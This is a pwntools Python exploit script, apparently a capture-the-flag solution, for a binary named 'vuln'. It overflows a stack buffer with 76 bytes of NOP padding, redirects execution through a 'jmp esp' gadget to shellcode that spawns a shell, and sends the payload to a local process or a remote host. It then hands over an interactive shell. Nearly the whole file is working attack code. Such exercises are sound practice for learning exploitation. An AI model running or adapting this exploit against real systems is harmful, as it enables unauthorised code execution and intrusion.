from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './challenge/vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'



# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Offset to EIP
padding = 76

# Assemble the byte sequence for 'jmp esp' so we can search for it
jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))

# Print flag
#shellcode = asm(shellcraft.cat('/home/phm/Desktop/ChalluriASII/BleedTheFreak/challenge/flag.txt'))
shellcode = asm(shellcraft.sh())
# Exit
shellcode += asm(shellcraft.exit())

# Build payload
payload = flat(
    asm('nop') * padding,
    jmp_esp,
    asm('nop') * 16,
    shellcode
)

# Write payload to file
write("payload", payload)

# Exploit
io.sendlineafter(b'Try and get the flag\n', payload)

# Get flag/shell
io.interactive()